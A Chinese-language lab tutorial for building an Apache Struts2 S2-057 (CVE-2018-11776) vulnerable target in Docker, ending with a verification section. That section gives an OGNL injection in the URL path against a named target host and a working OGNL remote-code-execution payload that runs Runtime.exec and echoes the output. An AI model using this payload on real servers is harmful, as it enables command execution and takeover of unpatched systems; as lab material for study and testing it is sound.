# St2-057 在线靶机环境，Enjoy！


# 0x01 搭建环境docker

https://github.com/vulhub/vulhub/tree/master/struts2/s2-048

```
docker-compose up -d
```

# 0x02 搭建st2-057漏洞环境

```
docker exec -i -t 88fd8d560155 /bin/bash
```
后台启动进入docker
![](./docker-struts-048.jpg)

根据公告
https://struts.apache.org/releases.html

```
Release	Release Date	Vulnerability	Version Notes
Struts 2.5.16	16 March 2018	S2-057	Version notes
Struts 2.5.14.1	30 November 2017	Version notes
Struts 2.5.14	23 November 2017	S2-055, S2-054	Version notes
```
![](./in-st2-57.jpg)
Struts 2.5.16存在s2-057漏洞，然后去下载这个版本

https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip/

```

apt-get update -y
mkdir /usr/local/tomcat/webapps/test
wget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip
apt-get install unzip -y
cp struts2-showcase.war /usr/local/tomcat/webapps/

```
![](./wget-st2-057.jpg)

# 0x03 修改配置文件

先查找文件struts-actionchaining.xml，发现有2处需要修改
```
root@88fd8d560155:/usr/local/tomcat/webapps/test# locate struts-actionchaining.xml
/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml
/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml
/usr/local/tomcat/webapps/test/struts-2.5.16/src/apps/showcase/src/main/resources/struts-actionchaining.xml
root@88fd8d560155:/usr/local/tomcat/webapps/test# 

```
配置文件修改-参考链接：
https://lgtm.com/blog/apache_struts_CVE-2018-11776

改为如下所示：

```
<struts>
    <package name="actionchaining" extends="struts-default">
        <action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
           <result type="redirectAction">
             <param name = "actionName">register2</param>
           </result>
        </action>
    </package>
</struts>
```
![](./struts-actionchaining.jpg)

然后去bin目录，kill掉进程,因为修改了配置文件，所以需要重启服务
```
root@88fd8d560155:/usr/local/tomcat/bin# cd /usr/local/tomcat/bin/
root@88fd8d560155:/usr/local/tomcat/bin# ls
bootstrap.jar	    catalina.sh			  commons-daemon.jar  daemon.sh  setclasspath.sh  startup.sh	   tool-wrapper.sh
catalina-tasks.xml  commons-daemon-native.tar.gz  configtest.sh       digest.sh  shutdown.sh	  tomcat-juli.jar  version.sh
root@88fd8d560155:/usr/local/tomcat/bin# ./shutdown.sh 

```
![](./down.jpg)

# 0x04 重启服务，st2-057搭建完成
```
 ✘ ⚡ root@HK  ~/vulhub/struts2/s2-048   master ●  docker-compose up -d
Starting s2-048_struts2_1 ... done
 ⚡ root@HK  ~/vulhub/struts2/s2-048   master ●  
```
![](./start.jpg)
# 0x05  验证st2-057
docker 靶机：http://www.canyouseeme.cc:8080/struts2-showcase/

命令执行：http://www.canyouseeme.cc:8080/struts2-showcase/${(111+111)}/actionChain1.action

${(111+111)}

得到执行结果返回在url中：http://www.canyouseeme.cc:8080/struts2-showcase/222/register2.action

![](./st2-57.jpg)

#### Ps: ${(111+111)} 可以替换成以前的poc，例如S2-032

![](./calc.jpg)

poc-example:
```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new  java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),#jas502n.println(#d ),#jas502n.close())}
```
拆分
```
${
(
#_memberAccess["allowStaticMethodAccess"]=true,
#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),
#b=new java.io.InputStreamReader(#a),
#c=new java.io.BufferedReader(#b),
#d=new char[51020],
#c.read(#d),
#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),
#jas502n.println(#d),
#jas502n.close())
}
```
# 0x06 参考链接

```
https://github.com/vulhub/vulhub/tree/master/struts2/s2-048
https://lgtm.com/blog/apache_struts_CVE-2018-11776
https://cwiki.apache.org/confluence/display/WW/S2-057
https://www.anquanke.com/post/id/157518
```
